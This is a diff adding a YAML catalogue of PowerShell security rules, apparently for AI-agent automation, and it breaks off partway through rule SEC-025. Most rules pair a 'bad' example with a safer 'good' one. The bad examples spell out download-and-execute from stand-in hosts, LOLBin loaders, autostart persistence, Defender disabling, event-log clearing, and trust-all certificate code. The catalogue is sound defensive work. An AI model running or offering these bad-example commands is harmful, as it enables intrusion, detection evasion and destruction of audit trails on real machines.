+    $wc = New-Object System.Net.WebClient
+    iex $wc.DownloadString('https://stage.example.tld/run.ps1')
+    iex ([Text.Encoding]::UTF8.GetString($wc.DownloadData($url)))
+    iex ($wc.DownloadString($TemplateUrl) -replace '__TOKEN__', $value)
+  good: |
+    $path = Join-Path -Path $env:TEMP -ChildPath 'vendor-run.ps1'
+    $wc = New-Object System.Net.WebClient
+    $wc.DownloadFile($SourceUrl, $path)
+    if ((Get-FileHash -Path $path -Algorithm SHA256).Hash -ne $ExpectedSha256) {
+        throw 'Integrity verification failed for downloaded payload.'
+    }
+    $signature = Get-AuthenticodeSignature -FilePath $path
+    if ($signature.Status -ne 'Valid') { throw "Signature verification failed: $($signature.Status)" }
+    & $path
+  rationale: Direct-to-iex downloads bypass proxy logging, antivirus scanning, and any chance of human
+    review. Persisting to disk first restores every defensive control at negligible cost.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - security
+  - download-execute
+  - dotnet-api
+- id: SEC-004
+  category: security
+  severity: critical
+  title: curl.exe/wget.exe drop-to-temp-then-execute requires pinned hash or signature
+  description: Shelling out to curl.exe or wget.exe to drop an executable into the temp directory and
+    immediately run it is an unsigned download-and-run pattern. Executed artifacts must be version-pinned,
+    stored under a managed path rather than temp, and pass a SHA256 or Authenticode check before the first
+    launch.
+  bad: |
+    curl.exe -sSLo "$env:TEMP\setup.exe" https://mirror.example.tld/setup.exe
+    & "$env:TEMP\setup.exe" /quiet /norestart
+    wget.exe -q -O "$env:TEMP\a.zip" https://files.example.tld/a.zip
+    Expand-Archive "$env:TEMP\a.zip" "$env:TEMP\a"; & "$env:TEMP\a\tool.cmd"
+  good: |
+    $dest = Join-Path -Path $InstallRoot -ChildPath 'vendor\setup-4.2.1.exe'   # managed path, never temp
+    curl.exe -sSLo $dest https://mirror.example.tld/vendor/setup-4.2.1.exe
+    if ($LASTEXITCODE -ne 0) { throw "curl.exe failed with exit code $LASTEXITCODE." }
+    if ((Get-FileHash $dest -Algorithm SHA256).Hash -ne $ExpectedSha256) { throw "Hash mismatch for $dest." }
+    if ((Get-AuthenticodeSignature $dest).Status -ne 'Valid') { throw "Signature mismatch for $dest." }
+    & $dest /quiet /norestart
+  rationale: Temp directories are writable staging grounds where binaries can be swapped between download
+    and execution. Pinning version and digest closes that race and makes every deployment reproducible.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - security
+  - download-execute
+  - lolbin
+- id: SEC-005
+  category: security
+  severity: critical
+  title: No EncodedCommand payloads or base64-decode-then-execute workflows
+  description: Base64-wrapped command strings conceal intent from operators, transcripts, and static analysis,
+    and are indistinguishable from malware tradecraft in telemetry. Do not generate or run -EncodedCommand
+    children, decoded byte arrays, or FromBase64String round trips that end in execution; pass plain,
+    visible arguments instead.
+  bad: |
+    $cmd = 'Get-ChildItem C:\Users -Recurse | Compress-Archive -DestinationPath C:\audit.zip'
+    $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
+    Start-Process powershell.exe -ArgumentList "-NoProfile -EncodedCommand $b64" -Wait
+    $decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($blob))
+    Invoke-Expression $decoded
+  good: |
+    # Plain-text invocation keeps the child action readable in transcripts and EDR telemetry.
+    $taskScript = Join-Path -Path $PSScriptRoot -ChildPath 'invoke-audit.ps1'
+    $childArgs = @('-NoProfile', '-NonInteractive', '-File', $taskScript, '-Mode', 'Audit')
+    $proc = Start-Process -FilePath "$PSHOME\powershell.exe" -ArgumentList $childArgs -Wait -PassThru
+    if ($proc.ExitCode -ne 0) { throw "Audit child process failed with exit code $($proc.ExitCode)." }
+  rationale: Encoding exists to slip past parsers and humans alike; nothing legitimate in agent-authored
+    automation requires it. Visible argument vectors keep parent-child attribution intact for incident
+    response.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - security
+  - obfuscation
+  - process-launch
+- id: SEC-006
+  category: security
+  severity: critical
+  title: 'No living-off-the-land loaders: mshta, rundll32, regsvr32 invoked from scripts'
+  description: mshta.exe, rundll32.exe, and regsvr32.exe accept URLs, HTML applications, and scriptlet
+    COM registration tricks that execute remote or inline code while wearing signed OS-binary cover. Agent
+    scripts must not invoke these loaders to run fetched or generated content, even as a convenience;
+    such requests receive an explicit refusal and a signed-installer alternative.
+  bad: |
+    mshta.exe https://cdn.example.tld/setup.hta
+    rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -c iex(irm https://x.example.tld/p)")
+    regsvr32.exe /s /n /u /i:https://cdn.example.tld/scrobj.sct scrobj.dll
+  good: |
+    # Explicit refusal with justification, followed by the compliant alternative.
+    if ($RequestedTool -in @('mshta.exe', 'rundll32.exe', 'regsvr32.exe')) {
+        throw ('Refused: {0} executes remote or scriptlet code behind an OS-binary facade. ' +
+            'Ship the payload as a signed MSI/MSIX and deploy it through a package provider.') -f $RequestedTool
+    }
+    Install-Package -Name 'VendorTool' -ProviderName NuGet -Source $InternalRepo -RequiredVersion '4.2.1'
+  rationale: LOLBin abuse launders execution through trusted binaries and defeats allow-listing and most
+    detection logic. Refusal plus a packaging alternative moves the same outcome onto an auditable, signed
+    supply chain.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - security
+  - lolbin
+- id: SEC-007
+  category: security
+  severity: critical
+  title: Scheduled-task actions must not point at downloaded or foreign binaries
+  description: Persistence whose action launches a temp-dropped executable, or a shell command that fetches
+    code at trigger time, converts any single compromise into reboot-surviving control. Task actions must
+    target hash-verified artifacts under managed paths with explicit arguments and no network retrieval
+    inside the task command line.
+  bad: |
+    $action = New-ScheduledTaskAction -Execute "$env:TEMP\drop\agent.exe" -Argument '-beacon'
+    Register-ScheduledTask -TaskName 'HealthProbe' -Action $action -Trigger (New-ScheduledTaskTrigger -AtStartup)
+    New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -WindowStyle Hidden -Command "irm https://x.example.tld/p.ps1 | iex"'
+  good: |
+    $exe = 'D:\Managed\Vendor\probe\probe.exe'   # version-controlled deployment path
+    if (-not (Test-Path -LiteralPath $exe)) { throw "Task target missing: $exe" }
+    if ((Get-FileHash $exe -Algorithm SHA256).Hash -ne $ApprovedSha256) {
+        throw 'Scheduled-task target does not match the approved build; refusing to register persistence.'
+    }
+    $action  = New-ScheduledTaskAction -Execute $exe -Argument '--mode=probe --config=D:\Managed\Vendor\probe\probe.config'
+    $trigger = New-ScheduledTaskTrigger -Daily -At 03:00
+    Register-ScheduledTask -TaskName 'Vendor-Probe-Daily' -Action $action -Trigger $trigger -Description 'Reviewed under CHG-1042' | Out-Null
+  rationale: Scheduled actions run unattended and often elevated, so their targets need the same provenance
+    discipline as production deployments. Hash pinning at registration time freezes what will execute
+    months later.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - security
+  - persistence
+  - scheduled-tasks
+- id: SEC-008
+  category: security
+  severity: critical
+  title: No Run-key autostart persistence writes (HKCU/HKLM Run)
+  description: Creating or modifying values under the Run and RunOnce keys plants undocumented autostart
+    persistence and mirrors core implant tradecraft. Startup needs must go through reviewed Task Scheduler
+    definitions or packaged services; ad-hoc scripts must not touch autostart registry values, and removal
+    of foreign entries must be documented explicitly.
+  bad: |
+    Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SysHelper' -Value "$env:TEMP\upd\svc.exe"
+    New-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'Telemetry' -Value 'powershell.exe -nop -w hidden -e <base64-blob>' -PropertyType String -Force
+    reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d '%TEMP%\up.exe' /f
+  good: |
+    # Supported startup mechanism: a reviewed logon-triggered task pointing at a pinned binary.
+    $exe = 'D:\Managed\Helper\helper.exe'
+    if ((Get-FileHash $exe -Algorithm SHA256).Hash -ne $ApprovedSha256) { throw 'Binary not approved for autostart.' }
+    $action  = New-ScheduledTaskAction -Execute $exe -Argument '--standby'
+    $trigger = New-ScheduledTaskTrigger -AtLogOn
+    Register-ScheduledTask -TaskName 'Managed-VendorHelper' -Action $action -Trigger $trigger -Description 'Reviewed under CHG-2077' | Out-Null
+    # Removing a pre-existing rogue value is allowed when recorded in the change log:
+    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'SysHelper' -ErrorAction SilentlyContinue
+  rationale: Run keys survive reboots, execute automatically in the user context, and stay invisible unless
+    specifically audited. Centralizing autostart in reviewed tasks keeps persistence discoverable and
+    attributable.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - security
+  - persistence
+  - registry
+- id: SEC-009
+  category: security
+  severity: critical
+  title: Never tamper with Microsoft Defender via Set-MpPreference/Add-MpPreference
+  description: Disabling real-time monitoring or carving exclusions for paths, extensions, processes,
+    or IP addresses blinds endpoint protection exactly where untrusted code runs. Agent automation must
+    not alter Defender preferences; legitimate exceptions belong to the security team as scoped, time-boxed
+    changes, while read-only diagnostics of Defender state remain allowed.
+  bad: |
+    Set-MpPreference -DisableRealtimeMonitoring $true
+    Add-MpPreference -ExclusionPath 'C:\Temp' -ExclusionExtension '.ps1', '.exe'
+    Add-MpPreference -ExclusionProcess 'buildworker.exe'
+    Set-MpPreference -DisableBehaviorMonitoring $true -DisableScriptScanning $true
+  good: |
+    # Hard refusal with escalation path; the agent neither disables nor excludes anything.
+    if ($RequestText -match 'Set-MpPreference|Add-MpPreference|DisableRealtimeMonitoring|Exclusion') {
+        Write-Warning 'Defender tampering request refused. File a security exception ticket for human approval.'
+        return
+    }
+    # Read-only diagnostics stay permitted:
+    Get-MpComputerStatus | Select-Object -Property AMRunningMode, RealTimeProtectionEnabled
+  rationale: Exclusions and disabled sensors are the highest-value objectives of real intrusions; scripting
+    them turns any prompt injection or typo into a fleet-wide blind spot. Deny by default and route exceptions
+    through human change control.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - security
+  - defense-evasion
+  - defender
+- id: SEC-010
+  category: security
+  severity: high
+  title: Do not weaken execution policy with Bypass or Unrestricted
+  description: Setting Set-ExecutionPolicy to Bypass or Unrestricted removes the guardrail that contains
+    unsigned script sprawl and hides why scripts were being blocked. Keep RemoteSigned or stricter, sign
+    internal scripts with a code-signing certificate, and treat any policy change as a documented platform-owner
+    exception rather than a step inside a script.
+  bad: |
+    Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
+    Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
+    powershell.exe -ExecutionPolicy Bypass -File .\downloaded.ps1
+  good: |
+    # Sign the script once, then run it under the existing policy - no weakening required.
+    $cert = Get-ChildItem Cert:\CurrentUser\My -CodeSigningCert |
+        Sort-Object -Property NotAfter -Descending | Select-Object -First 1
+    if (-not $cert) { throw 'No code-signing certificate available; request one via PKI onboarding.' }
+    $sig = Set-AuthenticodeSignature -FilePath .\deploy.ps1 -Certificate $cert -TimestampServer 'http://timestamp.digicert.com'
+    if ($sig.Status -ne 'Valid') { throw "Signing failed: $($sig.Status)" }
+    & .\deploy.ps1
+  rationale: Execution policy is not a security boundary, but it is an effective guardrail against accidental
+    unsigned execution. Scripts that flip it normalize the bypass and leave machines permanently weaker
+    after the task ends.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - security
+  - policy-weakening
+- id: SEC-011
+  category: security
+  severity: critical
+  title: Hidden-window launches of downloaded executables are prohibited
+  description: 'Starting freshly downloaded executables with -WindowStyle Hidden, typically paired with
+    -Verb RunAs, is the stealth-install silhouette of droppers: no visible surface, no operator awareness,
+    silent elevation. Installers must run visibly from verified artifacts with the launch recorded; hidden
+    windows are acceptable only for approved service binaries deployed by documented packages.'
+  bad: |
+    $tmp = "$env:TEMP\agent_build.exe"
+    curl.exe -sSL -o $tmp https://relay.example.tld/agent_build.exe
+    Start-Process -FilePath $tmp -ArgumentList '/S' -WindowStyle Hidden -Verb RunAs -Wait
+  good: |
+    $installer = Join-Path -Path $InstallRoot -ChildPath 'vendor\agent-setup-2.3.0.exe'   # verified per SEC-004 checks
+    if (-not (Test-Path -LiteralPath $installer)) { throw 'Installer missing; refusing to launch.' }
+    if ((Get-AuthenticodeSignature $installer).Status -ne 'Valid') { throw 'Installer signature invalid.' }
+    # Visible, logged launch; any elevation prompt stays interactive and attributable.
+    $proc = Start-Process -FilePath $installer -ArgumentList '/quiet', '/norestart' -PassThru -Wait
+    Write-Output ("Install finished with exit code {0} at {1}" -f $proc.ExitCode, (Get-Date -Format o))
+  rationale: Concealment is the common denominator of malicious launches; an agent has no operational
+    reason to hide an installer window from its own operator. Visibility plus signature verification restores
+    accountability to software installation.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - security
+  - stealth-launch
+  - process-launch
+- id: SEC-012
+  category: security
+  severity: high
+  title: TLS downgrade hacks are forbidden; never force legacy SecurityProtocol
+  description: Overwriting ServicePointManager SecurityProtocol to force TLS 1.0, TLS 1.1, or SSL3, or
+    replacing the protocol set with magic numbers to satisfy an old endpoint, silently downgrades every
+    connection in the process to broken cryptography. Remediate the endpoint or SChannel configuration
+    instead; the only permitted adjustment on Windows PowerShell 5.1 is enabling TLS 1.2 alongside protocols
+    already offered.
+  bad: |
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Ssl3
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls
+    [Net.ServicePointManager]::SecurityProtocol = 'Tls11'
+    [Net.ServicePointManager]::SecurityProtocol = 48 -bor 192   # magic numbers, downgrades the whole process
+  good: |
+    # Windows PowerShell 5.1: raise the floor to TLS 1.2 while keeping stronger protocols offered.
+    if ($PSVersionTable.PSEdition -eq 'Desktop') {
+        [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
+    }
+    # PowerShell 7+ negotiates TLS 1.2/1.3 by default; configure nothing.
+    # An endpoint that still rejects TLS 1.2 gets fixed on the server side, never met halfway.
+  rationale: Protocol downgrades expose credentials and payloads to interception and tend to persist long
+    after the original compatibility problem was forgotten. OR-ing in Tls12 raises security without removing
+    anything the runtime already offers.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - security
+  - tls
+- id: SEC-013
+  category: security
+  severity: critical
+  title: Certificate validation must never be suppressed
+  description: Trust-all policies via ServicePointManager.CertificatePolicy, validation callbacks that
+    return true unconditionally, and casual use of -SkipCertificateCheck disable server identity checking
+    and turn any network hop into a man-in-the-middle channel. Import the issuing CA, repair name or expiry
+    problems, or pin the exact expected thumbprint with logging when legacy hardware truly leaves no alternative.
+  bad: |
+    add-type @"
+    using System.Net;
+    using System.Security.Cryptography.X509Certificates;
+    public class TrustAllCertsPolicy : ICertificatePolicy {
+        public bool CheckValidationResult(ServicePoint sp, X509Certificate cert, WebRequest req, int problem) { return true; }
+    }
+    "@
+    [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
+    Invoke-RestMethod -Uri https://legacy.internal.example.tld/api -SkipCertificateCheck
+  good: |
+    # Proper fix first: trust the internal CA so normal validation succeeds.
+    Import-Certificate -FilePath '\\pkifs.corp.example.tld\pki\corp-root-ca.cer' -CertStoreLocation Cert:\LocalMachine\Root
+    Invoke-RestMethod -Uri https://legacy.internal.example.tld/api
+    # Last resort for one pinned legacy device: exact-thumbprint match, audited, time-boxed waiver.
+    $pin = $ChangeRequest.ServerThumbprint   # taken from the approved change record, never guessed
+    $handler = [System.Net.Http.HttpClientHandler]::new()
+    $handler.ServerCertificateCustomValidationCallback = {
+        param($req, $cert, $chain, $errs)
+        $ok = ($null -ne $cert) -and ($cert.GetCertHashString() -ieq $pin)
+        Write-Output ("TLS pin evaluation: matched={0}" -f $ok)   # audit every evaluation
+        $ok
+    }
+    $client = [System.Net.Http.HttpClient]::new($handler)
+  rationale: Suppressing validation reduces TLS from an identity guarantee to mere encryption, letting
+    any on-path host impersonate the destination. CA import or thumbprint pinning preserves the identity
+    property even when certificates are imperfect.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - security
+  - certificate-validation
+- id: SEC-014
+  category: security
+  severity: critical
+  title: Plaintext credential persistence is prohibited
+  description: Agent scripts must not write credentials to disk or environment in any form that yields
+    recoverable plaintext, including ConvertTo-SecureString -AsPlainText -Force round-trips, GetNetworkCredential()
+    dumps of Get-Credential objects, and Set-Content or export of raw secret material.
+  bad: |
+    $cred = Get-Credential
+    $pwd  = $cred.GetNetworkCredential().Password
+    "username=$($cred.UserName);password=$pwd" |
+        Set-Content -Path "$env:TEMP\deploy.creds"
+
+    # A literal wrapped in SecureString is still plaintext at authoring time
+    $secure = ConvertTo-SecureString 'P@ssw0rd!' -AsPlainText -Force
+    $secure | ConvertFrom-SecureString | Set-Content C:\seeds\key.txt
+  good: |
+    # Secrets live only in an encrypted, audited vault; retrieved at runtime
+    Set-Secret -Name 'deploy-key' `
+        -Secret (Read-Host 'Deploy key' -AsSecureString) `
+        -Vault 'OpsVault'
+
+    $cred = Get-Secret -Name 'deploy-account' -Vault 'OpsVault'
+    Invoke-Command -ComputerName 'web01' -Credential $cred -ScriptBlock {
+        hostname
+    }
+  rationale: Plaintext copies outlive their rotation window and turn every backup, snapshot, or temp directory
+    holding them into an offline-readable credential store; vault-backed secrets remain encrypted at rest
+    with access auditing.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - secrets
+  detection:
+    psscriptanalyzer: PSAvoidUsingConvertToSecureStringWithPlainText
+- id: SEC-015
+  category: security
+  severity: critical
+  title: Passwords must never appear on command lines
+  description: Passwords supplied as arguments to native tools such as net user, msiexec ADMINPASSWORD
+    properties, or remote-exec clients with a -p flag are exposed through process listings, CIM command
+    capture, and script-block logging the instant the process launches.
+  bad: |
+    net user localadmin 'S3cr3tP@ss!' /add /y
+
+    msiexec.exe /i setup.msi ADMINPASSWORD='S3cr3tP@ss!' /qn
+
+    psexec.exe \\srv01 -u CORP\admin -p 'S3cr3tP@ss!' cmd.exe
+  good: |
+    # Account creation goes through APIs that accept SecureString, never argv
+    $sec  = Get-Secret -Name 'localadmin-temp' -Vault 'OpsVault'
+    $user = New-LocalUser -Name 'svc-deploy' -Password $sec `
+              -PasswordNeverExpires -AccountNeverExpires
+
+    # A native tool that demands a password argument is refused; escalate
+    # for a vault-backed API path instead of passing secrets on a command line
+    throw 'Tool requires a password argv; refusing. Escalating for an API alternative.'
+  rationale: Command lines are visible to every local principal via process enumeration, to EDR telemetry,
+    and to script-block logging; a secret placed in argv is compromised at launch regardless of downstream
+    storage.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - secrets
+  detection:
+    psscriptanalyzer: PSAvoidUsingPlainTextForPassword
+- id: SEC-016
+  category: security
+  severity: critical
+  title: Secrets must never be echoed to output or logs
+  description: Secrets printed to stdout, verbose streams, transcripts, or log files become durable plaintext
+    records readable by anyone with log access; this includes emitting PSCredential contents and ConvertFrom-SecureString
+    recovery blobs.
+  bad: |
+    $cred = Get-Credential
+    Write-Output "Connecting as $($cred.UserName) with password $($cred.GetNetworkCredential().Password)"
+
+    $recovery = ConvertFrom-SecureString -SecureString $token
+    Write-Output "Recovery blob for safekeeping: $recovery"
+  good: |
+    # Identity metadata is loggable; secret material never is
+    Write-Output ("Connected to {0} as account 'svc-deploy' (secret redacted)" -f $target)
+
+    # Length-based diagnostics only
+    Write-Output ("Token acquired; length {0} chars, stored in OpsVault" -f $token.Length)
+  rationale: Transcripts and log aggregation replicate whatever reaches an output stream to every system
+    that stores those logs, converting a transient in-memory secret into permanent shared plaintext.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - secrets
+- id: SEC-017
+  category: security
+  severity: critical
+  title: Private-key and PFX export require documented approval
+  description: Exporting certificate private keys to PFX files moves non-repudiable identity material
+    out of the certificate store and onto shares or disks; any export requires a documented purpose and
+    explicit human approval recorded before execution.
+  bad: |
+    $cert = Get-ChildItem Cert:\LocalMachine\My |
+        Where-Object Subject -match 'intranet'
+
+    Export-PfxCertificate -Cert $cert -FilePath '\\filesrv\keys\web.pfx' `
+        -Password (ConvertTo-SecureString 'TempExport1!' -AsPlainText -Force)
+  good: |
+    # Gate on a recorded, human-approved export request
+    if (-not (Test-Path 'C:\secure\approvals\pfx-export.approved')) {
+        throw 'Refusing key export: no documented approval on file. Escalating to the owner.'
+    }
+
+    # With approval recorded: export locally, encrypted password from the vault,
+    # never staged onto a network share
+    Export-PfxCertificate -Cert $cert -FilePath 'C:\secure\web.pfx' `
+        -Password (Get-Secret -Name 'pfx-export' -Vault 'OpsVault')
+  rationale: An extracted private key enables impersonation and traffic decryption wherever a copy lands;
+    the irreversible nature of key-material loss demands a human approval gate ahead of any export operation.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - keys
+- id: SEC-018
+  category: security
+  severity: high
+  title: Persisted tokens must live behind restrictive ACLs
+  description: Tokens, cookies, and cached credentials written under default ACLs inherit world-readable
+    permissions such as broad ProgramData access; persistence to disk requires explicit ACL restriction
+    to SYSTEM and Administrators, or preferably no disk copy at all.
+  bad: |
+    $tok = (Invoke-RestMethod -Uri $authEndpoint).access_token
+    Set-Content -Path 'C:\ProgramData\myapp\token.cache' -Value $tok
+    # The file inherits defaults that let every authenticated user read it
+  good: |
+    $path = 'C:\ProgramData\myapp\token.cache'
+    Set-Content -Path $path -Value $tok
+
+    # Strip inherited ACEs, then grant only SYSTEM and Administrators
+    $acl = Get-Acl -Path $path
+    $acl.SetAccessRuleProtection($true, $false)
+    'BUILTIN\Administrators', 'NT AUTHORITY\SYSTEM' | ForEach-Object {
+        $acl.AddAccessRule([System.Security.AccessControl.FileSystemAccessRule]::new(
+            $_, 'FullControl', 'Allow'))
+    }
+    Set-Acl -Path $path -AclObject $acl
+  rationale: World-readable secret files give any low-privileged principal or malware running in user
+    context a direct path to privileged sessions; an explicit deny-by-default ACL is the minimum condition
+    for on-disk persistence.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - secrets
+  - filesystem
+- id: SEC-019
+  category: security
+  severity: high
+  title: Inline Add-Type and P-Invoke require a review gate
+  description: Compiling and invoking inline C# with P-Invoke bypasses module signing and code-review
+    pipelines and is the standard staging technique for memory allocation and API abuse; agent scripts
+    must refuse inline native code and consume reviewed, signed assemblies instead.
+  bad: |
+    Add-Type -MemberDefinition '
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr VirtualAlloc(IntPtr addr, uint size, uint type, uint protect);
+    ' -Name Raw -Namespace Win32
+
+    [Win32.Raw]::VirtualAlloc([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
+  good: |
+    # Inline unmanaged compilation sidesteps review, signing, and auditability
+    throw 'Add-Type with embedded C# requires a reviewed, signed helper assembly; refusing.'
+
+    # Approved alternative: import the vetted internal module from the trusted feed
+    Import-Module -Name 'Corp.ApprovedNative' -ErrorAction Stop
+  rationale: Arbitrary compiled code executes outside every policy surface the framework can inspect,
+    and P-Invoke signatures are the canonical primitive for injection techniques; only reviewed, signed
+    binaries belong in the trust boundary.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - native-code
+- id: SEC-020
+  category: security
+  severity: critical
+  title: Remote installers must be verified before execution
+  description: Downloading and executing installers directly from remote URLs skips signature and provenance
+    verification entirely; installation artifacts must originate from pinned allow-listed endpoints, carry
+    valid Authenticode signatures, and match approved SHA-256 hashes before any execution.
+  bad: |
+    iex (irm 'https://get.example-tools.dev/install.ps1')
+
+    msiexec.exe /i https://cdn.example-vendor.com/agents/agent.msi /qn
+  good: |
+    $pkg  = 'C:\secure\agent-1.4.2.msi'   # fetched earlier from a pinned allow-listed host
+    $sig  = Get-AuthenticodeSignature -FilePath $pkg
+    $hash = (Get-FileHash -Path $pkg -Algorithm SHA256).Hash
+
+    if ($sig.Status -ne 'Valid')          { throw 'Installer signature invalid; refusing.' }
+    if ($hash -ne $manifest.agent.sha256) { throw 'Artifact hash mismatch; refusing.' }
+
+    Start-Process -FilePath 'msiexec.exe' -ArgumentList '/i', $pkg, '/qn' -Wait
+  rationale: Pipe-to-shell installs execute whatever the remote origin serves at fetch time, inheriting
+    every compromise of that origin or its path; signature plus hash verification pins execution to reviewed
+    bytes rather than a mutable URL.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - supply-chain
+  - network
+- id: SEC-021
+  category: security
+  severity: high
+  title: WinRM and CredSSP enablement must be narrowly scoped
+  description: Wildcard CredSSP delegation and blanket WinRM reconfiguration widen the remote attack surface
+    and expose delegated credentials to every intermediate hop; delegation must name explicit hosts, and
+    service-level configuration changes belong in the platform team runbook.
+  bad: |
+    Enable-WSManCredSSP -Role Client -DelegateComputer '*' -Force
+
+    winrm quickconfig -force
+
+    Enable-WSManCredSSP -Role Server -Force
+  good: |
+    # Delegate to explicitly enumerated hosts only, backed by a change record
+    $targets = Get-Content 'C:\secure\approvals\credssp-targets.txt'
+    foreach ($t in $targets) {
+        Enable-WSManCredSSP -Role Client -DelegateComputer $t
+    }
+
+    # Server-role enablement and WinRM bootstrap are infrastructure changes:
+    # refuse here and hand off to the platform team's approved runbook
+    throw 'Server-side WSMan changes require the platform runbook; escalating.'
+  rationale: CredSSP delegation forwards plaintext-equivalent credentials to the target computer, so a
+    wildcard delegate list turns any compromised host into a credential collector for the entire estate.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - remote-management
+- id: SEC-022
+  category: security
+  severity: high
+  title: JEA and constrained-language boundaries are inviolable
+  description: Attempts to flip SessionState LanguageMode, spawn interpreters or shells outside the JEA
+    sandbox, or abuse visible functions to reach blocked APIs violate the session security contract; the
+    correct response is refusal and escalation to the session owner.
+  bad: |
+    # Escape attempt: relax language mode
+    $ExecutionContext.SessionState.LanguageMode = 'FullLanguage'
+
+    # Escape attempt: sibling interpreter outside the JEA sandbox
+    Start-Process -FilePath "$env:SystemRoot\System32\cmd.exe" -ArgumentList '/c whoami'
+  good: |
+    # Role capabilities and constrained language mode are the contract, not obstacles
+    throw 'Operation exceeds this session role capability; escalating to the session owner.'
+
+    # If the underlying task is legitimate, propose adding the needed visible
+    # function or cmdlet to the role capability file via change review
+  rationale: JEA and constrained language mode exist precisely because untrusted automation must run inside
+    a bounded capability set; every circumvention attempt converts a controlled session into an uncontrolled
+    one and must fail closed.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - jea
+- id: SEC-023
+  category: security
+  severity: critical
+  title: Audit trails must never be suppressed or cleared
+  description: Stopping transcripts mid-task, clearing Security or Windows PowerShell event logs with
+    wevtutil cl, disabling script-block logging, or scrubbing history destroys accountability; audit-trail
+    integrity overrides every other operational objective and log changes require security-team approval.
+  bad: |
+    Stop-Transcript
+    wevtutil cl Security
+    wevtutil cl 'Windows PowerShell'
+    Clear-History
+
+    Set-ItemProperty `
+        -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' `
+        -Name EnableScriptBlockLogging -Value 0
+  good: |
+    # Every action stays on the record for the life of the session
+    $log = 'C:\secure\transcripts\session-{0:yyyyMMdd-HHmmss}.log' -f (Get-Date)
+    Start-Transcript -Path $log -Append
+
+    try {
+        # perform the approved work; event logs and script-block logging stay enabled
+    }
+    finally {
+        Stop-Transcript   # closes only at session end, never to conceal activity
+    }
+  rationale: An operator who can erase the record of their own actions defeats every other control retroactively;
+    preserving transcripts and event logs is the precondition for detecting and reconstructing any incident.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - audit
+- id: SEC-024
+  category: security
+  severity: medium
+  title: Outbound calls must pin endpoints and enforce TLS
+  description: Outbound N-class operations must resolve destinations from a signed allow-list, pin the
+    https scheme, and validate certificates; caller-supplied URLs, cleartext http endpoints, and SkipCertificateCheck
+    shortcuts are rejected.
+  bad: |
+    Invoke-RestMethod -Uri 'http://packages.internal.corp/feed/index.json'
+
+    Invoke-RestMethod -Uri $env:TELEMETRY_URL        # caller-controlled destination
+
+    Invoke-WebRequest -SkipCertificateCheck -Uri $mirror   # TLS validation disabled
+  good: |
+    # Destination resolves only from the signed allow-list; scheme pinned to https
+    $base = Resolve-ApprovedEndpoint -Name 'telemetry'
+    if (-not $base.StartsWith('https://')) { throw 'Non-TLS endpoint rejected.' }
+
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    Invoke-RestMethod -Method Post -Uri "$base/v1/report" `
+        -ContentType 'application/json' -Body $payload
+  rationale: Unpinned destinations and disabled certificate validation let a redirected or intercepted
+    connection deliver payloads and exfiltrate data through the very channel the operation was supposed
+    to trust.
+  applies_to:
+  - powershell-5.1
+  - powershell-7
+  tags:
+  - network
+- id: SEC-025
+  category: security
+  severity: critical
+  title: Delegation and grants must follow least privilege
+  description: Admin-consenting tenant-root scopes, granting Organization Management or equivalent roles
+    to service identities, and reusing domain-administrator credentials for routine tasks violate least
+    privilege; grants must be narrow in scope, bound to named resources, and time-bounded, with tenant-root
+    consents gated by human approval.
+  bad: |
+    # Tenant-root admin consent: the app receives every requested scope org-wide
+    az ad app permission admin-consent --id $agentAppId
+
+    New-ManagementRoleAssignment -Role 'Organization Management' -User 'CORP\svc-agent'
+
+    # Domain-administrator reuse for a routine web-tier restart
+    $da = Get-Credential 'CORP\DomainAdmin'
+    Invoke-Command -ComputerName 'web01' -Credential $da -ScriptBlock { iisreset }
+  good: |
+    # Root-of-tree grants always require a documented human decision
